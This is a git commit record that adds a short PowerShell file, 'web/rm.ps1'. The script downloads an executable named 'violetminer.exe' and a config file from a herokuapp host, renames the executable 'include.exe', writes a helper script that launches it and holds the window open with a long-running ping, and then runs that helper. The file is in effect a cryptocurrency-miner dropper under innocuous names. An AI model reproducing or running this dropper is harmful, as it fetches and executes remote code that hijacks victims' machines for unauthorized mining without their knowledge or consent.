113168da417a7021ece8e4e7f069f8c523f9217a
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-04 16:33:59 +0000

    Create rm.ps1

---
+++ web/rm.ps1
@@ -0,0 +1,5 @@
+Invoke-WebRequest https://papakola01.herokuapp.com/violetminer.exe -OutFile include.exe
+Invoke-WebRequest https://papakola01.herokuapp.com/config.json -OutFile config.json
+cmd /c echo cmd /k start include.exe >>b.ps1
+cmd /c echo ping -n 999999 10.10.10.10 >>b.ps1
+.\b.ps1
